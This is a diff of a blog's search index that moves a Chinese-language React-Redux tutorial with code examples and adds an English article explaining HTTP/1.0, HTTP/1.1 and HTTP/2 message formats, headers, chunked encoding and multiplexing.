-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./redux/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    <span class="comment">//为所有组件提供store</span></span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App /&gt;</span><br><span class="line">    &lt;/Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="步骤二——编写store"><a href="#步骤二——编写store" class="headerlink" title="步骤二——编写store"></a>步骤二——编写store</h3><p>在store文件中引入能创建<code>store</code>实例的<code>creatStore</code>、能修改状态的<code>reducer</code>和能执行异步的<code>thunk</code>和中间件<code>applyMiddleware</code>（如果需要）。</p>
-<p>注：<strong>对于多个状态需要维护的情况，从<code>redux</code>中引入<code>combineReducers</code>方法，该方法可以通过对象<code>&#123;&#125;</code>的键值对<code>key:value</code>形式，维护任意多个状态（即reducer）。</strong></p>
-<p>实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware, combineReducers&#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> countReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/count&#x27;</span></span><br><span class="line"><span class="keyword">import</span> personReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/person&#x27;</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">&#x27;redux-thunk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> allReducers = combineReducers(&#123;<span class="attr">count</span>: countReducer, <span class="attr">people</span>: personReducer&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(allReducers, applyMiddleware(thunk))</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>
-<h3 id="步骤三——编写action"><a href="#步骤三——编写action" class="headerlink" title="步骤三——编写action"></a>步骤三——编写action</h3><p>引入store文件，和常量文件constant（如果有）。编写action函数，其会返回一个action对象，形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code>。</p>
-<p>实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;INCREMENT, DECREMENT&#125; <span class="keyword">from</span> <span class="string">&#x27;../constant&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:INCREMENT, data&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createDecrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:DECREMENT, data&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAsyncAction = <span class="function">(<span class="params">data, time</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            store.dispatch(&#123;<span class="attr">type</span>:INCREMENT, data&#125;)</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="步骤四——编写reducer"><a href="#步骤四——编写reducer" class="headerlink" title="步骤四——编写reducer"></a>步骤四——编写reducer</h3><p><strong>reducer负责维护状态。</strong>编写reducer函数，需要设置初始化的状态值，并对函数传入<code>action</code>参数，根据<code>action</code>对象的<code>type</code>和<code>data</code>对状态进行操作，并返回操作后的状态。</p>
-<p>实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">countReducer</span>(<span class="params">preState=initNumber, action</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;type, data&#125; = action;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;increment&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState + data;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;decrement&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState - data;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> preState;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<hr>
-<p>至此，redux部分的基本三大件已经写完。接下来需要编写组建模块。</p>
-<h3 id="步骤五——编写Container-Component"><a href="#步骤五——编写Container-Component" class="headerlink" title="步骤五——编写Container/Component"></a>步骤五——编写Container/Component</h3><p>首先，引入<code>action</code>，并从<code>react-redux</code>中引入<code>connect</code>函数，该函数用于创建并暴露一个Container容器，同时将state和action传入组件中，并且它们都会被传入到组件自身的<code>prorps</code>属性中。实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">// 引入connect</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"><span class="comment">// 引入action</span></span><br><span class="line"><span class="keyword">import</span> &#123;createIncrementAction, createDecrementAction, createIncrementAsyncAction&#125; <span class="keyword">from</span> <span class="string">&#x27;../../redux/actions/count&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Count</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  	<span class="comment">// 传入state</span></span><br><span class="line">    state =&gt; (&#123;<span class="attr">count</span>: state.count, <span class="attr">people</span>: state.people&#125;),</span><br><span class="line">  	<span class="comment">// 传入action</span></span><br><span class="line">    &#123;<span class="attr">increment</span>: createIncrementAction,</span><br><span class="line">     decrement: createDecrementAction,</span><br><span class="line">     asyncIncrement: createIncrementAsyncAction</span><br><span class="line">    &#125;</span><br><span class="line">    )(Count)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>FrontEnd/前端</category>
-      </categories>
-      <tags>
-        <tag>React</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>R-NoteBook</title>
     <url>/en/2021/02/16/Rnotebook/</url>
     <content><![CDATA[<h1 id="R-Lab1-Note"><a href="#R-Lab1-Note" class="headerlink" title="R Lab1 Note"></a>R Lab1 Note</h1><a id="more"></a>
@@ -791,6 +619,77 @@
       </tags>
   </entry>
   <entry>
+    <title>Redux入门操作详解</title>
+    <url>/en/2021/11/28/Redux%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
+<a id="more"></a>
+
+<h1 id="React-Redux"><a href="#React-Redux" class="headerlink" title="React-Redux"></a>React-Redux</h1><p><strong>首先，react-redux与redux的核心理念一致，只是一些API的使用上存在差异，react-redux使得在react中使用redux更为简便。</strong></p>
+<h2 id="Redux的三大原则——Three-Principles"><a href="#Redux的三大原则——Three-Principles" class="headerlink" title="Redux的三大原则——Three Principles"></a>Redux的三大原则——Three Principles</h2><h3 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h3><p>整个应用的<code>state</code>被存储在一棵object tree上，并且这个object tree只存在于<code>store</code>，且<code>store</code>是唯一的，仅此一个。</p>
+<h3 id="State只读"><a href="#State只读" class="headerlink" title="State只读"></a>State只读</h3><p>唯一改变state的方法是触发<strong>action</strong>，action是一个用于描述已发生事件的对象，其形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code></p>
+<h3 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h3><p><strong>为了描述action如何改变state tree，需要编写reducers。</strong></p>
+<p>Reducer只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。</p>
+<h2 id="React-Redux实际操作步骤"><a href="#React-Redux实际操作步骤" class="headerlink" title="React-Redux实际操作步骤"></a>React-Redux实际操作步骤</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在src下新建名为<code>redux</code>的文件，并创建好4个common JS文件，分别为<code>store.js</code>, <code>reducer.js</code>, <code>action.js</code>以及<code>constant.js</code>。其中<code>constant.js</code>用于存储常量，其余三个代表redux的三个核心。</p>
+<p>注：如果不只一个<code>action/reducer</code>，可以分别创建action和reducer的文件夹。</p>
+<p>在<code>index.js</code>中引入<code>store.js</code>，并从<code>react-redux</code>中引入<code>Provider</code>，<code>Provider</code>组件用于给<code>App</code>下的每个需要用到redux的组件传递<code>store</code>。实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./redux/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    <span class="comment">//为所有组件提供store</span></span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App /&gt;</span><br><span class="line">    &lt;/Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="步骤二——编写store"><a href="#步骤二——编写store" class="headerlink" title="步骤二——编写store"></a>步骤二——编写store</h3><p>在store文件中引入能创建<code>store</code>实例的<code>creatStore</code>、能修改状态的<code>reducer</code>和能执行异步的<code>thunk</code>和中间件<code>applyMiddleware</code>（如果需要）。</p>
+<p>注：<strong>对于多个状态需要维护的情况，从<code>redux</code>中引入<code>combineReducers</code>方法，该方法可以通过对象<code>&#123;&#125;</code>的键值对<code>key:value</code>形式，维护任意多个状态（即reducer）。</strong></p>
+<p>实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware, combineReducers&#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> countReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/count&#x27;</span></span><br><span class="line"><span class="keyword">import</span> personReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/person&#x27;</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">&#x27;redux-thunk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> allReducers = combineReducers(&#123;<span class="attr">count</span>: countReducer, <span class="attr">people</span>: personReducer&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(allReducers, applyMiddleware(thunk))</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>
+<h3 id="步骤三——编写action"><a href="#步骤三——编写action" class="headerlink" title="步骤三——编写action"></a>步骤三——编写action</h3><p>引入store文件，和常量文件constant（如果有）。编写action函数，其会返回一个action对象，形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code>。</p>
+<p>实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;INCREMENT, DECREMENT&#125; <span class="keyword">from</span> <span class="string">&#x27;../constant&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:INCREMENT, data&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createDecrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:DECREMENT, data&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAsyncAction = <span class="function">(<span class="params">data, time</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            store.dispatch(&#123;<span class="attr">type</span>:INCREMENT, data&#125;)</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="步骤四——编写reducer"><a href="#步骤四——编写reducer" class="headerlink" title="步骤四——编写reducer"></a>步骤四——编写reducer</h3><p><strong>reducer负责维护状态。</strong>编写reducer函数，需要设置初始化的状态值，并对函数传入<code>action</code>参数，根据<code>action</code>对象的<code>type</code>和<code>data</code>对状态进行操作，并返回操作后的状态。</p>
+<p>实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">countReducer</span>(<span class="params">preState=initNumber, action</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;type, data&#125; = action;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;increment&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState + data;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;decrement&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState - data;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> preState;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>至此，redux部分的基本三大件已经写完。接下来需要编写组建模块。</p>
+<h3 id="步骤五——编写Container-Component"><a href="#步骤五——编写Container-Component" class="headerlink" title="步骤五——编写Container/Component"></a>步骤五——编写Container/Component</h3><p>首先，引入<code>action</code>，并从<code>react-redux</code>中引入<code>connect</code>函数，该函数用于创建并暴露一个Container容器，同时将state和action传入组件中，并且它们都会被传入到组件自身的<code>prorps</code>属性中。实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">// 引入connect</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"><span class="comment">// 引入action</span></span><br><span class="line"><span class="keyword">import</span> &#123;createIncrementAction, createDecrementAction, createIncrementAsyncAction&#125; <span class="keyword">from</span> <span class="string">&#x27;../../redux/actions/count&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Count</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  	<span class="comment">// 传入state</span></span><br><span class="line">    state =&gt; (&#123;<span class="attr">count</span>: state.count, <span class="attr">people</span>: state.people&#125;),</span><br><span class="line">  	<span class="comment">// 传入action</span></span><br><span class="line">    &#123;<span class="attr">increment</span>: createIncrementAction,</span><br><span class="line">     decrement: createDecrementAction,</span><br><span class="line">     asyncIncrement: createIncrementAsyncAction</span><br><span class="line">    &#125;</span><br><span class="line">    )(Count)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>FrontEnd/前端</category>
+      </categories>
+      <tags>
+        <tag>React</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/en/2021/02/14/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -818,6 +717,186 @@
       <tags>
         <tag>CONCEPT</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/en/2022/02/17/HTTP%20&amp;%20Network/</url>
+    <content><![CDATA[<hr>
+<p>title: HTTP &amp; Network Security<br>date: 2021-12-06<br>categories: Network<br>tags: [HTTP]<br>comments: false<br>summary_img: … /cover/https.svg</p>
+<p>**This article focuses on some common computer networking concepts and summarizes them for future in-depth understanding of web development. **</p>
+<p>&lt;! –more–&gt;</p>
+<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h2 id="HTTP-Protocol"><a href="#HTTP-Protocol" class="headerlink" title="HTTP Protocol"></a>HTTP Protocol</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>HTTP is a TCP/IP based <strong>application layer protocol</strong>. It does not involve the transmission of datagrams, but mainly specifies the format of communication between the client and the server, and uses port 80 by default.</p>
+<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
+<li><p>1996 - Released</p>
+</li>
+<li><p>Version 1.0 introduced the POST and HEAD commands in addition to the GET command, which was the only one available in version 0.9.</p>
+</li>
+<li><p>HTTP request and response formats, in addition to including <strong>data sections</strong> must also include <strong>header information i.e. HTTP HEADER</strong> (to describe metadata)</p>
+</li>
+</ul>
+<h4 id="request-format"><a href="#request-format" class="headerlink" title="request format"></a>request format</h4><p>Request command + multi-line headers</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 request command</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) Multi-line headers</span><br><span class="line">Accept: *&#x2F;* Multi-line headers</span><br></pre></td></tr></table></figure>
+<h4 id="Response-format"><a href="#Response-format" class="headerlink" title="Response format"></a>Response format</h4><p>Header + blank line + data. First line is protocol version + status code + status description</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK first line</span><br><span class="line">Content-Type: text&#x2F;plain from here onwards is the header</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											This is a blank line</span><br><span class="line">&lt;html&gt; Data from here onwards</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Content-Type-field"><a href="#Content-Type-field" class="headerlink" title="Content-Type field"></a>Content-Type field</h4><p>The headers are ASCII, but the data can be in any format. Therefore <strong><code>Content-Type</code> is needed to tell the client the format of this data</strong>.</p>
+<p>Common <code>Content-Type</code> field values are as follows.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
+<p>These data types are collectively known as <strong>MIME type</strong> and are in the format: primary type/secondary type.</p>
+<h4 id="Content-Encoding-field"><a href="#Content-Encoding-field" class="headerlink" title="Content-Encoding field"></a>Content-Encoding field</h4><p>As <strong>the data sent can be in any format</strong>, it is possible to compress the data before sending it. The <strong><code>Content-Encoding</code> field describes how the data is compressed</strong>. Common compression methods.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
+<p>Also** when the client requests**, it can specify the compression method it <strong>accepts</strong>, using the <strong>field <code>Accept-Encoding</code></strong>. as follows.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+<h4 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>The main problem with HTTP/1.0 is that: <strong>only one request can be sent per TCP connection</strong>. Once the data is sent, the link is closed. To request another resource, another TCP connection must be created. The TCP connection requires three handshakes between the client and the server, and starts off slowly due to slow start, making it costly to create a new TCP connection.</p>
+<p>** To solve this problem, some browsers use the non-standard field <code>Connection</code>. **</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<p>The above field requires the server not to close the TCP connection so that other requests can reuse it, and that reusable TCP connection will not be disconnected until either the client or the server actively closes it. However, this method is not standard.</p>
+<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>Used from 1997 to 201 several, until HTTPS.</p>
+<h4 id="Persistent-connections"><a href="#Persistent-connections" class="headerlink" title="Persistent connections"></a>Persistent connections</h4><ul>
+<li>The <strong>biggest change</strong> in version 1.1 was the introduction of <strong>persistent connection</strong>, i.e. TCP connections are not closed by default, can be reused by multiple requests and do not need to declare <code>Connection:keep-alive</code>.</li>
+<li>A connection is actively closed when there has been no communication between the client and the server for a period of time. However, the normative practice is for the client to send <code>Connection: close</code> on the last request, explicitly asking the server to close the TCP connection.</li>
+</ul>
+<p>**Note: **For the same domain name, most browsers allow <strong>6 persistent connections</strong> to be established at the same time.</p>
+<h4 id="Pipeline-mechanism"><a href="#Pipeline-mechanism" class="headerlink" title="Pipeline mechanism"></a>Pipeline mechanism</h4><p>In version 1.0, within the same TCP connection, if a client wanted to <strong>request two resources</strong>, it would <strong>send request A</strong> first, then wait for the server to respond, <strong>and then send request B</strong> after receiving the response**.</p>
+<p>In version 1.1 the <strong>pipelining</strong> mechanism was introduced, which allows the browser to <strong>send both an A request and a B request</strong>, but the server still responds to the A request first, in order, and then to the B request when it is done.</p>
+<p>Thus, the pipelining mechanism allows <strong>clients to send multiple requests</strong> at the same time over the same TCP connection.</p>
+<h4 id="Content-Length-field"><a href="#Content-Length-field" class="headerlink" title="Content-Length field"></a>Content-Length field</h4><p>** Used to declare the length of the data for this response. **</p>
+<h4 id="chunked-transfer-encoding"><a href="#chunked-transfer-encoding" class="headerlink" title="chunked-transfer-encoding"></a>chunked-transfer-encoding</h4><p>In short, it means that the server <strong>sends a piece of data as it is generated</strong>, i.e. it uses the stream mode instead of the buffer mode.</p>
+<p>Therefore, version 1.1 can use chunked transfer encoding instead of the <code>Content-Length</code> field. Whenever <strong>a request or response has a <code>Transfer-Encoding</code> field</strong> in its header, it indicates that the response will consist of an undetermined number of chunks of data.</p>
+<p><strong>Note:</strong> Each non-empty block of data will be preceded by a hexadecimal value to indicate the length of the block. It ends with a block of size 0, indicating that the data for this response has been sent. Examples are as follows.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h4 id="Other-features"><a href="#Other-features" class="headerlink" title="Other features"></a>Other features</h4><ul>
+<li>Version 1.1 also adds many new verb methods such as <code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
+<li>A new <code>HOST</code> field** has been added to the client request headers to specify the server’s domain name. With the <code>HOST</code> field it is possible to send a request to a different website on the same server. (Laying the groundwork for the rise of virtual machines)</li>
+</ul>
+<h4 id="Disadvantages-1"><a href="#Disadvantages-1" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>There is <strong>Head-of-line blocking</strong>. Although multiplexing of TCP connections is allowed, data communication within the <strong>same TCP connection is still sequential</strong> and the server can only respond to the next request after processing the response to the first one. If the response to the previous request is slow, then there will be many requests queued up behind it.</p>
+<p>Ways to avoid queue head blocking are.</p>
+<ol>
+<li><strong>reduce the number of requests</strong>. For example, merging scripts and stylesheets, embedding images in CSS code</li>
+<li><strong>Multiple simultaneous persistent connections</strong>. For example, domain sharding, where the required downloads can come from multiple domains, can solve the concurrency limit.</li>
+</ol>
+<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="Binary-protocol"><a href="#Binary-protocol" class="headerlink" title="Binary protocol"></a>Binary protocol</h4><p>HTTP/1.1 has a text (ASCII) header and a text or binary data body. HTTP/2, however, is a <strong>thoroughly binary protocol</strong>, where both the header and the data body are binary, and are collectively referred to as “frames”: header frames and data frames.</p>
+<p>The advantage of the binary protocol is that additional frames can be defined.</p>
+<h4 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h4><p>In HTTP/2, both the client and the browser can send multiple requests and responses at the same time over the same TCP connection, without having to correspond to each other in order, thus avoiding the problem of queue head blocking.</p>
+<p>For example, in a TCP connection, the server receives both request A and request B. It responds to request A first, which turns out to be very time-consuming to process, so it sends the part of request A that has already been processed, then processes the response to request B, and when it’s done, it processes the rest of the request that sent A. We call this <strong>duplex, real-time communication</strong> <strong>multiplex</strong>.</p>
+<h4 id="data-flow"><a href="#data-flow" class="headerlink" title="data flow"></a>data flow</h4><p>In HTTP/2, <strong>packets are sent out of order</strong>; consecutive packets inside the same connection may belong to different responses, so it is necessary to <strong>mark</strong> the packet to indicate which response it belongs to.</p>
+<p>HTTP/2 refers to <strong>all packets</strong> of each request or response as a <strong>stream</strong>. Each stream is given a unique number. When a packet is sent, it must be marked with a stream ID that identifies which stream it belongs to. In addition, all stream IDs sent by the client are odd numbers and all stream IDs sent by the server are even numbers.</p>
+<p>When the stream is sent halfway, both the client and the server can signal the stream to be cancelled. In HTTP/1.1, the only way to cancel a stream was to close the TCP connection. HTTP/2 can cancel a request while ensuring that the TCP connection is still open and can be reused for other requests.</p>
